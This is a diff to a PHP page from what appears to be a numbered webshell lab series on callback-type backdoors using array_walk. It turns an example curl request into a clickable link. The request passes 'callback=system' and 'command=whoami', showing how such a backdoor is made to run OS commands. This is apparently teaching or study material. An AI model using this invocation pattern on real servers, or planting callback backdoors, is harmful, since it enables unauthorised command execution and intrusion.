@@ -1,3 +1,7 @@
+<?php
+	$linux = 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami'
+?>
+
 <html>
 <head>
 	<meta charset="UTF-8"/>
@@ -7,7 +11,7 @@
 	<h1>013 - WebShell - 回调类型后门 - array_walk</h1>
 
 <p>不正常调用: </p>
-<pre>curl '<?= 'http://' . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . '?callback=system&amp;command=whoami' ?>'</pre>
+<p>curl '<a href="<?= $linux ?>" target="_blank"><?= $linux ?></a>'</p>
 <br>
 <br>
 <?php
